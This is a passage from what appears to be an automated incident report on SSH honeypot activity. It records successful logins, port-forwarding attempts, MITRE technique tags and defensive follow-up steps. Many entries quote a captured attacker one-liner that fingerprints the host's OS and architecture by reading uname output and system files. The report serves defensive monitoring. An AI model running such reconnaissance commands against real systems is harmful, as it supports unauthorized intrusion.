|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 19:28 |
| **Last Seen** | 2026-07-22 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:28:39` | `cowrie.session.connect` |
| `2026-07-22 19:28:39` | `cowrie.client.version` |
| `2026-07-22 19:28:39` | `cowrie.client.kex` |
| `2026-07-22 19:28:39` | `cowrie.login.success` |
| `2026-07-22 19:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-131b4cea938b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:29 |
| **Last Seen** | 2026-07-22 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:29:59` | `cowrie.session.connect` |
| `2026-07-22 19:29:59` | `cowrie.client.version` |
| `2026-07-22 19:29:59` | `cowrie.client.kex` |
| `2026-07-22 19:30:00` | `cowrie.login.success` |
| `2026-07-22 19:30:01` | `cowrie.session.params` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.success` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.command.input` |
| `2026-07-22 19:30:01` | `cowrie.log.closed` |
| `2026-07-22 19:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0647d43e37a0

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-22 19:30 |
| **Last Seen** | 2026-07-22 19:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:30:37` | `cowrie.session.connect` |
| `2026-07-22 19:30:37` | `cowrie.client.version` |
| `2026-07-22 19:30:37` | `cowrie.client.kex` |
| `2026-07-22 19:30:39` | `cowrie.login.success` |
| `2026-07-22 19:30:40` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca64e055d963

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:31 |
| **Last Seen** | 2026-07-22 19:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:31:41` | `cowrie.session.connect` |
| `2026-07-22 19:31:41` | `cowrie.client.version` |
| `2026-07-22 19:31:41` | `cowrie.client.kex` |
| `2026-07-22 19:31:42` | `cowrie.login.success` |
| `2026-07-22 19:31:44` | `cowrie.session.params` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.success` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.command.input` |
| `2026-07-22 19:31:44` | `cowrie.log.closed` |
| `2026-07-22 19:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcbf5e170aaa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:33 |
| **Last Seen** | 2026-07-22 19:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:33:24` | `cowrie.session.connect` |
| `2026-07-22 19:33:24` | `cowrie.client.version` |
| `2026-07-22 19:33:24` | `cowrie.client.kex` |
| `2026-07-22 19:33:26` | `cowrie.login.success` |
| `2026-07-22 19:33:27` | `cowrie.session.params` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.success` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.command.input` |
| `2026-07-22 19:33:27` | `cowrie.log.closed` |
| `2026-07-22 19:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c954c537041

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:35 |
| **Last Seen** | 2026-07-22 19:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:35:11` | `cowrie.session.connect` |
| `2026-07-22 19:35:11` | `cowrie.client.version` |
| `2026-07-22 19:35:11` | `cowrie.client.kex` |
| `2026-07-22 19:35:13` | `cowrie.login.success` |
| `2026-07-22 19:35:14` | `cowrie.session.params` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.success` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:14` | `cowrie.command.input` |
| `2026-07-22 19:35:15` | `cowrie.log.closed` |
| `2026-07-22 19:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786c9c684bd5

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-22 19:36 |
| **Last Seen** | 2026-07-22 19:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:36:31` | `cowrie.session.connect` |
| `2026-07-22 19:36:31` | `cowrie.client.version` |
| `2026-07-22 19:36:31` | `cowrie.client.kex` |
| `2026-07-22 19:36:32` | `cowrie.login.success` |
| `2026-07-22 19:36:33` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:36:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0082afc6d6ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:37 |
| **Last Seen** | 2026-07-22 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:37:00` | `cowrie.session.connect` |
| `2026-07-22 19:37:00` | `cowrie.client.version` |
| `2026-07-22 19:37:00` | `cowrie.client.kex` |
| `2026-07-22 19:37:01` | `cowrie.login.success` |
| `2026-07-22 19:37:02` | `cowrie.session.params` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.success` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:02` | `cowrie.command.input` |
| `2026-07-22 19:37:03` | `cowrie.log.closed` |
| `2026-07-22 19:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af60f85a2f2c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:38 |
| **Last Seen** | 2026-07-22 19:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:38:46` | `cowrie.session.connect` |
| `2026-07-22 19:38:47` | `cowrie.client.version` |
| `2026-07-22 19:38:47` | `cowrie.client.kex` |
| `2026-07-22 19:38:49` | `cowrie.login.success` |
| `2026-07-22 19:38:50` | `cowrie.session.params` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.success` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.command.input` |
| `2026-07-22 19:38:50` | `cowrie.log.closed` |
| `2026-07-22 19:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569040adc9d6

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-07-22 19:39 |
| **Last Seen** | 2026-07-22 19:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:39:36` | `cowrie.session.connect` |
| `2026-07-22 19:39:37` | `cowrie.client.version` |
| `2026-07-22 19:39:37` | `cowrie.client.kex` |
| `2026-07-22 19:39:38` | `cowrie.login.success` |
| `2026-07-22 19:39:39` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42eb0a1e088c

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-07-22 19:39 |
| **Last Seen** | 2026-07-22 19:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:39:44` | `cowrie.session.connect` |
| `2026-07-22 19:39:44` | `cowrie.client.version` |
| `2026-07-22 19:39:44` | `cowrie.client.kex` |
| `2026-07-22 19:39:45` | `cowrie.login.success` |
| `2026-07-22 19:39:45` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-616845614af8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:40 |
| **Last Seen** | 2026-07-22 19:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:40:32` | `cowrie.session.connect` |
| `2026-07-22 19:40:32` | `cowrie.client.version` |
| `2026-07-22 19:40:32` | `cowrie.client.kex` |
| `2026-07-22 19:40:33` | `cowrie.login.success` |
| `2026-07-22 19:40:34` | `cowrie.session.params` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.success` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.command.input` |
| `2026-07-22 19:40:34` | `cowrie.log.closed` |
| `2026-07-22 19:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ca943713dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:42 |
| **Last Seen** | 2026-07-22 19:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:42:17` | `cowrie.session.connect` |
| `2026-07-22 19:42:17` | `cowrie.client.version` |
| `2026-07-22 19:42:17` | `cowrie.client.kex` |
| `2026-07-22 19:42:18` | `cowrie.login.success` |
| `2026-07-22 19:42:19` | `cowrie.session.params` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.success` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:19` | `cowrie.command.input` |
| `2026-07-22 19:42:20` | `cowrie.log.closed` |
| `2026-07-22 19:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f73a2c10d25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:43 |
| **Last Seen** | 2026-07-22 19:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:43:57` | `cowrie.session.connect` |
| `2026-07-22 19:43:57` | `cowrie.client.version` |
| `2026-07-22 19:43:57` | `cowrie.client.kex` |
| `2026-07-22 19:43:58` | `cowrie.login.success` |
| `2026-07-22 19:43:59` | `cowrie.session.params` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.success` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.command.input` |
| `2026-07-22 19:43:59` | `cowrie.log.closed` |
| `2026-07-22 19:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855476fa8914

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:45 |
| **Last Seen** | 2026-07-22 19:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:45:40` | `cowrie.session.connect` |
| `2026-07-22 19:45:40` | `cowrie.client.version` |
| `2026-07-22 19:45:40` | `cowrie.client.kex` |
| `2026-07-22 19:45:40` | `cowrie.login.success` |
| `2026-07-22 19:45:41` | `cowrie.session.params` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.success` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
| `2026-07-22 19:45:41` | `cowrie.command.input` |
